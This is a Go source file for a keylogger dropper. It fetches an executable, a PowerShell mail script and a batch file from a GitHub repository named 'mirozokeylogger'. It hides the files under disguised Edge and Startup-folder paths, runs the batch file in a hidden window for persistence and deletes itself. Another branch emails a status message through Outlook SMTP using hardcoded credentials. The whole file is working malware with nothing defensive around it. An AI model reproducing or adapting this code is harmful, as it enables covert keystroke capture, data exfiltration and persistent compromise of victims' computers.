package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func main() {
	vcr := os.Getenv("C:\\Windows\\System32\\VCRUNTIME140.DLL")
	if _, err := os.Stat(vcr); err == nil {
		var err error

		err = download("https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/kk.exe", os.Getenv("LOCALAPPDATA")+"\\MicrosoftEdge\\404eb8b50ea0d5d6\\ygoLa8SyqmQTGsoh.exe")
		if err != nil {
			fmt.Println(err)
			return
		}

		err = download("https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/psmail.ps1", os.Getenv("LOCALAPPDATA")+"\\MicrosoftEdge\\404eb8b50ea0d5d6\\LhFDtKhHgdiXDSt3.ps1")
		if err != nil {
			fmt.Println(err)
			return
		}

		err = download("https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/hi.bat", os.Getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hi.bat")
		if err != nil {
			fmt.Println(err)
			return
		}

		cmd := exec.Command(os.Getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hi.bat")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
		err = cmd.Start()
		if err != nil {
			fmt.Println(err)
			return
		}
		err = os.Remove(os.Args[0])
		if err != nil {
			fmt.Println(err)
			return
		}
	} else {
		username := "jankowalski69zs@outlook.com"
		password := "JanKowalski1"
		from := "jankowalski69zs@outlook.com"
		to := "resultsiliketowatch@op.pl"
		subject := "No file detected."
		body := "Failed attempt 0x001"
		err := sendMail(username, password, from, to, subject, body, "smtp-mail.outlook.com", "587")
		if err != nil {
			fmt.Println(err)
			return
		}
		err = os.Remove(os.Args[0])
		if err != nil {
			fmt.Println(err)
			return
		}
	}
}

func download(url, dest string) error {
	res, err := http.Get(url)
	if err != nil {
		return err
	}
	defer res.Body.Close()

	data, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return err
	}

	err = ioutil.WriteFile(dest, data, 0666)
	if err != nil {
		return err
	}

	return nil
}

func sendMail(username, password, from, to, subject, body, smtpServer, port string) error {
	cmd := exec.Command("powershell", "Send-MailMessage", "-SmtpServer", smtpServer, "-UseSsl", "-Port", port, "-Credential", fmt.Sprintf("$(New-Object System.Management.Automation.PSCredential(%s, (ConvertTo-SecureString %s -AsPlainText -Force))", strings.Trim(username, " "), strings.Trim(password, " ")), "-From", from, "-To", to, "-Subject", subject, "-Body", body)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	err := cmd.Start()
	if err != nil {
		return err
	}
	return nil
}
